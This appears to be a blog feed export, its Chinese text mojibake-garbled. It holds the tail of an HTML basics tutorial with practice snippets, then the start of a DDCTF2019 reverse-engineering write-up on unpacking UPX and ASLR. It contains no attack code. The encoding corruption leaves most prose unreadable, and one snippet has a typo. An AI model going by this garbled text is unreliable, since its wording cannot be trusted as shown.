&lt;/map&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>æ•ˆæœ</strong>ï¼š<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-è¶…é“¾æ¥"><a href="#HTML-è¶…é“¾æ¥" class="headerlink" title="HTML è¶…é“¾æ¥"></a>HTML è¶…é“¾æ¥</h2><p>è¶…é“¾æ¥å¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¸€ä¸ªè¯ï¼Œæˆ–è€…ä¸€ç»„è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å¹…å›¾åƒï¼Œæ‚¨å¯ä»¥ç‚¹å‡»è¿™äº›å†…å®¹æ¥è·³è½¬åˆ°æ–°çš„æ–‡æ¡£æˆ–è€…å½“å‰æ–‡æ¡£ä¸­çš„æŸä¸ªéƒ¨åˆ†ã€‚ä½¿ç”¨æ ‡ç­¾ <code>&lt;a&gt;</code>æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚</p><ul><li><p><strong>HTML é“¾æ¥è¯­æ³•</strong>:<code>&lt;a href=&quot;url&quot;&gt;é“¾æ¥æ–‡æœ¬&lt;/a&gt;</code>  ,href å±æ€§æè¿°äº†é“¾æ¥çš„ç›®æ ‡ã€‚</p></li><li><p><strong>target å±æ€§</strong>  :<code>target=&quot;_blank&quot;</code>æ•ˆæœå°±æ˜¯åœ¨æ–°çª—å£ï¼ˆç©ºç™½ç•Œé¢ï¼‰åšå‡ºæ¥ ã€‚</p></li><li><p><strong>id å±æ€§</strong>:idå±æ€§å¯ç”¨äºåˆ›å»ºåœ¨ä¸€ä¸ªHTMLæ–‡æ¡£ä¹¦ç­¾æ ‡è®°,åœ¨HTMLæ–‡æ¡£ä¸­æ’å…¥ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code> </p><p>åœ¨HTMLæ–‡æ¡£ä¸­åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°â€æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†(id=â€tipsâ€ï¼‰â€:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;è®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code></p></li></ul><p><strong>è§£é‡ŠåŠ è¡¥å……</strong>ï¼šID å±æ€§åå­—åªèƒ½æœ‰ä¸€ä¸ªä¸å¯é‡å¤ï¼Œä¸”å¿…é¡»ä»¥==å­—æ¯==å¼€å¤´ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªç•Œé¢çš„ä»»ä½•ä½ç½®çš„å†…å®¹è¿›è¡Œè®¾ç½®IDï¼Œåœ¨è®¾ç½®å®Œåï¼Œï¼ˆ<code>&lt;a href=&quot;# &quot;&gt;</code>ï¼‰ï¼Œåœ¨==â€œ#â€==ååŠ å…¥idçš„åç§°å³å¯è·³è½¬åˆ°ä½ è®¾ç½®IDçš„å†…å®¹å¤„ã€‚</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>åšé”šç‚¹æ—¶ï¼Œæ›¿æ¢idçš„æ–¹æ³•ï¼Œä½œç”¨å¯ä»¥å®ç°ä¸€æ ·ï¼idä¸å¥½ç”¨æ—¶ç”¨è¿™ä¸ª</strong></p><p><strong>ç»ƒä¹ ï¼š</strong>ï¼ˆä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œçœç•¥äº†å¾ˆå¤šçš„<code>&lt;br&gt;</code>.ï¼‰</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;è¶…çº§é“¾æ¥&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a href=&quot;http://www.mi.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;1.png&quot;&gt;&lt;/a&gt;    &lt;!-- /*ä¹¦ç­¾æ ‡è®°ï¼šé”šç‚¹*/ --&gt;    &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;&lt;br id=&quot;aa&quot;&gt;&lt;br&gt;&lt;br id=&quot;miao&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=&quot;miao&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=&quot;end&quot;&gt;&lt;/a&gt;  &lt;a href=&quot;#miao&quot;&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML-åˆ—è¡¨"><a href="#HTML-åˆ—è¡¨" class="headerlink" title="HTML åˆ—è¡¨"></a>HTML åˆ—è¡¨</h2><ul><li><strong>HTMLæ— åºåˆ—è¡¨</strong>ï¼š<code>&lt;ul&gt;</code>ä¸ <code>&lt;li&gt;</code>å…¶ç‚¹çš„æ ·å¼(åœ†åœˆï¼Œåœ†å¿ƒï¼Œæ­£æ–¹å½¢ï¼‰ç”¨<strong>css</strong>æ¥æ§åˆ¶<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML æœ‰åºåˆ—è¡¨</strong> <code>&lt;ol&gt;</code>ä¸<code>&lt;li&gt;</code>   ç”¨æ³•å’Œæ— åºç›¸ä¼¼ï¼Œ<strong>ä¸”æœ‰åºä¸æ— åºä¹‹é—´å¯ä»¥äº’ç›¸åµŒå¥—</strong>ï¼Œ<strong>åµŒå¥—è¿‡ç¨‹ä¸­ç‚¹çš„å½¢çŠ¶ä¹Ÿä¼šè‡ªåŠ¨å˜åŒ–ã€‚</strong></li><li><strong>HTML è‡ªå®šä¹‰åˆ—è¡¨</strong>ï¼šè¿™ä¸ªæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼Œè‡ªå®šä¹‰åˆ—è¡¨ä»¥<code>&lt;dl&gt;</code> æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ <code>&lt;dt&gt;</code> å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ <code>&lt;dd&gt;</code>å¼€å§‹ã€‚å…¶<strong>ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚</strong></li></ul><pre><code class="html">&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;    &lt;!-- åˆ—è¡¨æ ‡é¢˜ --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt;   &lt;!-- å…¶å†…å®¹ --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt;</code></pre><p><strong>ç»ƒä¹ ï¼š</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul style=&quot;list-style-type:circle&quot;&gt;        &lt;li&gt;æ— åºåˆ—è¡¨1&lt;/li&gt;        &lt;li&gt;æ— åºåˆ—è¡¨2&lt;/li&gt;        &lt;li&gt;æ— åºåˆ—è¡¨3&lt;/li&gt;        &lt;li&gt;æ— åºåˆ—è¡¨4&lt;/li&gt;    &lt;/ul&gt;    &lt;ol&gt;        &lt;li&gt;æœ‰åºåˆ—è¡¨1&lt;/li&gt;        &lt;li&gt;æœ‰åºåˆ—è¡¨2&lt;/li&gt;        &lt;li&gt;æœ‰åºåˆ—è¡¨3&lt;/li&gt;        &lt;li&gt;æœ‰åºåˆ—è¡¨4&lt;/li&gt;    &lt;/ol&gt;    &lt;dl&gt;        &lt;dt&gt;æ ‡é¢˜1&lt;/dt&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨1&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨2&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨3&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨4&lt;/dd&gt;        &lt;dt&gt;æ ‡é¢˜2&lt;/dt&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨1&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨2&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨3&lt;/dd&gt;        &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨4&lt;/dd&gt;    &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTMLè¡¨æ ¼"><a href="#HTMLè¡¨æ ¼" class="headerlink" title="HTMLè¡¨æ ¼"></a>HTMLè¡¨æ ¼</h2><ul><li><p><strong>HTML è¡¨æ ¼</strong>ï¼šè¡¨æ ¼ç”± <code>&lt;table&gt;</code>æ ‡ç­¾æ¥å®šä¹‰ã€‚æ¯ä¸ªè¡¨æ ¼å‡æœ‰è‹¥å¹²==è¡Œ==ï¼ˆç”± <code>&lt;tr&gt;</code> æ ‡ç­¾å®šä¹‰ï¼‰ï¼Œæ¯è¡Œè¢«åˆ†å‰²ä¸ºè‹¥å¹²==å•å…ƒæ ¼==ï¼ˆç”± <code>&lt;td&gt;</code> æ ‡ç­¾å®šä¹‰ï¼‰ã€‚å­—æ¯ td æŒ‡<strong>è¡¨æ ¼æ•°æ®</strong>ï¼ˆtable dataï¼‰ï¼Œå³æ•°<strong>æ®å•å…ƒæ ¼çš„å†…å®¹</strong>ã€‚æ•°æ®å•å…ƒæ ¼å¯ä»¥åŒ…å«<strong>æ–‡æœ¬ã€å›¾ç‰‡ã€åˆ—è¡¨ã€æ®µè½ã€è¡¨å•ã€æ°´å¹³çº¿ã€è¡¨æ ¼</strong>ç­‰ç­‰ã€‚è¿™ä¸ªæœ‰åˆ©äºå¤šæ ·åŒ–ï¼Œåœ¨åˆ†æ¸…æ ç›®ååœ¨tdé‡Œæ”¾å†…å®¹å°±okã€‚</p></li><li><p><strong>HTML è¾¹æ¡†å±æ€§</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>ä¼šå‡ºç°è¡¨æ¡†ã€‚</p></li><li><p><strong>HTML è¡¨æ ¼è¡¨å¤´</strong>:è¡¨æ ¼çš„è¡¨å¤´ä½¿ç”¨ <code>&lt;th&gt;</code> æ ‡ç­¾è¿›è¡Œå®šä¹‰ã€‚<code>&lt;th&gt;</code>æ ‡ç­¾ä¸<code>&lt;td&gt;</code>æ ‡ç­¾<strong>ç”¨æ³•ç›¸ä¼¼åªæ˜¯æ˜¾ç¤ºçš„æ•ˆæœä¸åŒï¼Œä¼šæœ‰ç²—ä½“å±…ä¸­çš„æ•ˆæœï¼›</strong></p></li><li><p><strong>HTMLè¡¨æ ¼åˆå¹¶</strong>ï¼šç”¨ <strong>colspan</strong>ï¼š æ¨ªå‘è¡Œ  <strong>rowspan</strong>  ï¼šç«–çºµè¡Œã€‚</p></li><li><p><strong>HTMLè¡¨æ ¼å•å…ƒæ ¼è¾¹è·çš„è®¾ç½®</strong>ï¼šç±»ä¼¼ <strong>è®¾ç½®è¾¹æ¡†</strong> ç›´æ¥åœ¨tableæ ‡ç­¾é‡Œæ”¾å…¥<strong>cellpadding=â€œè‡ªå®šä¹‰çš„æ•°å­—â€</strong>ï¼Œå°±è®¾ç½®å¥½äº†ã€‚</p></li></ul><p><strong>ç»ƒä¹ ï¼š</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;è¡¨æ ¼&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot;&gt;         &lt;tr&gt;           &lt;th&gt;éƒ¨é—¨&lt;/th&gt;           &lt;th&gt;å§“å&lt;/th&gt;           &lt;th&gt;æ€§åˆ«&lt;/th&gt;           &lt;th&gt;å·¥èµ„&lt;/th&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td rowspan=&quot;3&quot;&gt;å¼€å‘ç»„&lt;/td&gt;             &lt;td&gt;å°æ˜&lt;/td&gt;             &lt;td&gt;ç”·&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td&gt;å°ç™½&lt;/td&gt;             &lt;td&gt;å¥³&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;         &lt;td colspan=&quot;2&quot;&gt;å·¥èµ„åˆè®¡&lt;/td&gt;         &lt;td&gt;2w&lt;/td&gt;         &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-è¡¨å•"><a href="#HTML-è¡¨å•" class="headerlink" title="HTML è¡¨å•"></a>HTML è¡¨å•</h2><p>è¡¨å•æ˜¯ä¸€ä¸ªåŒ…å«<strong>è¡¨å•å…ƒç´ </strong>çš„åŒºåŸŸã€‚è¡¨å•å…ƒç´ æ˜¯å…è®¸ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥å†…å®¹,æ¯”å¦‚ï¼šæ–‡æœ¬åŸŸ(textarea)ã€ä¸‹æ‹‰åˆ—è¡¨ã€å•é€‰æ¡†(radio-buttons)ã€å¤é€‰æ¡†(checkboxes)ç­‰ç­‰ã€‚</p><p>`<form><br>inputå…ƒç´ </form></p>\\\\\`<h4 id="HTML-è¡¨å•-è¾“å…¥å…ƒç´ "><a href="#HTML-è¡¨å•-è¾“å…¥å…ƒç´ " class="headerlink" title="HTML è¡¨å• - è¾“å…¥å…ƒç´ "></a>HTML è¡¨å• - è¾“å…¥å…ƒç´ </h4><p>è¾“å…¥æ ‡ç­¾<code>&lt;input&gt;</code>ã€‚</p><h4 id="æ–‡æœ¬åŸŸ"><a href="#æ–‡æœ¬åŸŸ" class="headerlink" title="æ–‡æœ¬åŸŸ"></a>æ–‡æœ¬åŸŸ</h4><p>æ–‡æœ¬åŸŸé€šè¿‡<code>&lt;input type=&quot;text&quot;&gt;</code> æ ‡ç­¾æ¥è®¾å®šï¼Œå½“ç”¨æˆ·è¦åœ¨è¡¨å•ä¸­é”®å…¥å­—æ¯ã€æ•°å­—ç­‰å†…å®¹æ—¶ï¼Œå°±ä¼šç”¨åˆ°æ–‡æœ¬åŸŸã€‚</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>åœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­ï¼Œæ–‡æœ¬åŸŸçš„ç¼ºçœå®½åº¦æ˜¯20ä¸ªå­—ç¬¦ã€‚</strong></p><h4 id="å¯†ç å­—æ®µ"><a href="#å¯†ç å­—æ®µ" class="headerlink" title="å¯†ç å­—æ®µ"></a>å¯†ç å­—æ®µ</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> æ¥å®šä¹‰</p><pre><code class="html">&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><h4 id="å•é€‰æŒ‰é’®"><a href="#å•é€‰æŒ‰é’®" class="headerlink" title="å•é€‰æŒ‰é’®"></a>å•é€‰æŒ‰é’®</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> æ ‡ç­¾å®šä¹‰äº†è¡¨å•å•é€‰æ¡†é€‰é¡¹ã€‚</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;Male&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;value=&quot;female&quot;&gt;Female&lt;/form&gt;</code></pre><p><strong>Name æ˜¯å¯ä»¥è¿›è¡Œ==åˆ†ç»„==ã€‚æƒ³è¦æœ‰æ•ˆæœ valueä¹Ÿå°‘ä¸äº†ã€‚</strong></p><h4 id="å¤é€‰æ¡†"><a href="#å¤é€‰æ¡†" class="headerlink" title="å¤é€‰æ¡†"></a>å¤é€‰æ¡†</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>å®šä¹‰äº†å¤é€‰æ¡†. ç”¨æˆ·éœ€è¦ä»è‹¥å¹²ç»™å®šçš„é€‰æ‹©ä¸­é€‰å–ä¸€ä¸ªæˆ–è‹¥å¹²é€‰é¡¹ã€‚</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;I have a bike&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;I have a car &lt;/form&gt;</code></pre><p><strong>ç±»ä¼¼å•é€‰ä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚</strong></p><h4 id="æäº¤æŒ‰é’®"><a href="#æäº¤æŒ‰é’®" class="headerlink" title="æäº¤æŒ‰é’®"></a>æäº¤æŒ‰é’®</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>å®šä¹‰äº†æäº¤æŒ‰é’®. </p><pre><code class="html">&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><p>==valueï¼šæäº¤æ•°æ®åˆ°æœåŠ¡å™¨çš„å€¼ï¼ˆåå°ç¨‹åºPHPä½¿ç”¨ï¼‰å†™æŒ‰é’®æ—¶ä¸€å®šè¦å†™ä¸Šã€‚   nameï¼šä¸ºæ§ä»¶å‘½åï¼Œä»¥å¤‡åå°ç¨‹åº ASPã€PHP ä½¿ç”¨==</p><h4 id="ç»ƒä¹ ï¼š-1"><a href="#ç»ƒä¹ ï¼š-1" class="headerlink" title="ç»ƒä¹ ï¼š"></a>ç»ƒä¹ ï¼š</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;è¡¨å•&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot;&gt; &lt;!-- action ä¸­å€¼ä¸ºæäº¤çš„ç½‘é¡µ --&gt;&lt;!-- é»˜è®¤ä¸ºget --&gt;        admin&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;        password&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;male&quot;&gt;ç”· &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;female&quot;&gt;å¥³          &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;ä¸­æ€§&lt;!-- nameä¸­å€¼ä¸€æ ·é‚£ä¹ˆå…¶åˆ†ç»„å°±ä¸€æ · --&gt;        &lt;!-- &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;ç”·        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;å¥³        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;ä¸­æ€§ --&gt;        &lt;br&gt;        &lt;!-- å…´è¶£å¤é€‰æ¡† --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;kanshu&quot;&gt; çœ‹ä¹¦        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;xuexi&quot;&gt;  å­¦ä¹         &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;music&quot;&gt;  å¬æ­Œ        &lt;br&gt;    åŸå¸‚&lt;select name=&quot;city&quot;&gt;            &lt;option value=&quot;shanghai&quot;&gt;ä¸Šæµ·&lt;/option&gt;            &lt;option value=&quot;beijing&quot;&gt;åŒ—äº¬&lt;/option&gt;        &lt;/select&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;&lt;br&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTMLå¸ƒå±€"><a href="#HTMLå¸ƒå±€" class="headerlink" title="HTMLå¸ƒå±€"></a>HTMLå¸ƒå±€</h2><p><strong>HTML å¸ƒå±€ - ä½¿ç”¨<code>&lt;div&gt;</code> å…ƒç´ .</strong></p><p>å¯ä»¥å…ˆåˆ†ä¸ºå¤´éƒ¨div åº•éƒ¨div å’Œä¸­é—´çš„divï¼Œç„¶åé€æ­¥æ·»åŠ æ ‡ç­¾è¿›è¡Œæ‰©å……ï¼Œç”¨<strong>css</strong>æ¥è®¾ç½®æ ·å¼ã€‚</p><p>è¿™ä¸­é—´éœ€è¦ç”¨åˆ°floatï¼šleftç­‰ æ¥æ§åˆ¶ä¸€ä¸ªdivä¸­å¥—ç”¨çš„divçš„ä½ç½®ã€‚</p><ul><li>HTMLä¸­<code>&lt;div&gt;</code>å…ƒç´ æ˜¯å—çº§å…ƒç´ ï¼Œå®ƒå¯ç”¨äºç»„åˆå…¶ä»– HTMLå…ƒç´ çš„å®¹å™¨ã€‚</li><li><code>&lt;div&gt;</code> å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ–‡æ¡£å¸ƒå±€ã€‚<code>&lt;div&gt;</code>å…ƒç´ ç»å¸¸ä¸ <strong>CSS</strong> ä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥å¸ƒå±€ç½‘é¡µã€‚</li><li><code>&lt;div&gt;</code> å…ƒç´ æ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚</li></ul><p><strong>ç»ƒä¹ ï¼š</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;å¸ƒå±€&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;div style=&quot;background: yellow; width: 50px;&quot;&gt;        è¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdiv    &lt;/div&gt; --&gt;    &lt;div style=&quot;background: yellow;height: 100px;&quot;&gt;å¯¼èˆª&lt;/div&gt;    &lt;div style=&quot;background: green;width: 20%; float: left; height: 300px;&quot;&gt;èœå•&lt;/div&gt;    &lt;di+v style=&quot;background: red;width: 80%; float: left;height: 300px;&quot;&gt;å†…å®¹&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTMLåµŒå¥—è§„åˆ™"><a href="#HTMLåµŒå¥—è§„åˆ™" class="headerlink" title="HTMLåµŒå¥—è§„åˆ™"></a>HTMLåµŒå¥—è§„åˆ™</h2><h4 id="å…ƒç´ åˆ†ç±»ï¼š"><a href="#å…ƒç´ åˆ†ç±»ï¼š" class="headerlink" title="å…ƒç´ åˆ†ç±»ï¼š"></a>å…ƒç´ åˆ†ç±»ï¼š</h4><ul><li><strong>æ–‡å­—ç±»å—å…ƒç´ </strong>ï¼šp  h1~h6</li><li><strong>å®¹å™¨ç±»å—å…ƒç´ </strong>ï¼šdiv table tr td th form ul li ol dl dt dd</li><li><strong>è¡Œå…ƒç´ </strong>:ä¸ç‹¬ç«‹æˆè¡Œï¼Œä¸å¯ä»¥  å†…å®¹å†³å®ša img input strong em del span</li><li><strong>ç‰¹æ®Šå­—ç¬¦</strong>:br </li></ul><h4 id="è§„åˆ™"><a href="#è§„åˆ™" class="headerlink" title="è§„åˆ™"></a>è§„åˆ™</h4><ul><li>å—å…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  <code>&lt;div&gt;è¿™æ˜¯div &lt;a href=&quot;&quot;&gt;è¿™æ˜¯a&lt;/a&gt; &lt;/div&gt;</code></li><li>è¡Œå…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  <code>&lt;a href=&quot;&quot;&gt;è¿™æ˜¯ä¸ª&lt;strongã€‰ a&lt;/strong&gt;</code></li><li>è¡Œå…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´ </li><li>æ–‡å­—ç±»æŠ‰å…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´ </li><li>å®¹å™¨ç±»æŠ‰å…ƒç´ å¯ä»¥åµŒå¥—å—å…ƒç´ </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <url>/2019/11/17/DDCTF2019-RE-Windows%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä¸€ä¸ªè®ºå›é‡Œå‘ç°DDCTFè¿™ä¸¤é“é€†å‘é¢˜ä¸æ˜¯å¾ˆéš¾ï¼Œå°±æƒ³ç€åšä¸€ä¸‹ç»ƒç»ƒæ‰‹ã€‚å› ä¸ºæœ€è¿‘åšçš„éƒ½æ˜¯æ¯”è¾ƒè€çš„é¢˜ç›®ï¼Œè¿™ä¸ªè¿˜ç®—æ–°ä¸€ç‚¹çš„ã€‚é¢˜ç›®ä¸‹è½½ï¼š<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>å¯ä»¥çœ‹å‡ºæ˜¯UPXå£³ã€‚<br>å¦å¤–ï¼š</p><pre><code> /Volumes/data/ctfé€†å‘é¢˜ç›®/2019ddctf î‚° file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre><p>åœ¨macç»ˆç«¯ä¹Ÿå¯ä»¥ç”¨fileå‘½ä»¤æŸ¥å‡ºã€‚</p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p>ç›´æ¥åœ¨ç»ˆç«¯UPX -d è„±äº†å°±å¯ä»¥äº†ã€‚</p><h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><p>å‘ç°ç›´æ¥æ˜¯è¿è¡Œä¸äº†çš„ï¼Œæƒ³åˆ°æ˜¯ä¸æ˜¯å› ä¸ºè„±å£³åè¿™ä¸ªéœ€è¦èµ„æºä¿®å¤ï¼Œå„ç§æ“ä½œä¿®å¤åå‘ç°è¿˜æ˜¯ä¸å¯ä»¥ã€‚æœ€åæŸ¥è¯¢ä»–äººwpå‘ç°è¿™ä¸ªç¨‹åºå¼€å¯äº†<strong>ASLR</strong>ã€‚éœ€è¦peå·¥å…·å»å…³é—­è¿™ä¸ªç¨‹åºçš„ASLRã€‚ç„¶åæˆ‘å°±å»æŸ¥äº†ASLRæ˜¯æ€ä¹ˆå…³é—­çš„ï¼Œä¸”å…¶æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLRé€šè¿‡éšæœºæ”¾ç½®è¿›ç¨‹å…³é”®æ•°æ®åŒºåŸŸçš„åœ°å€ç©ºé—´æ¥é˜²æ­¢æ”»å‡»è€…èƒ½å¯é åœ°è·³è½¬åˆ°å†…å­˜çš„ç‰¹å®šä½ç½®æ¥åˆ©ç”¨å‡½æ•°ã€‚ç°ä»£æ“ä½œç³»ç»Ÿä¸€èˆ¬éƒ½åŠ è®¾è¿™ä¸€æœºåˆ¶ï¼Œä»¥é˜²èŒƒæ¶æ„ç¨‹åºå¯¹å·²çŸ¥åœ°å€è¿›è¡ŒReturn-to-libcæ”»å‡»ã€‚ 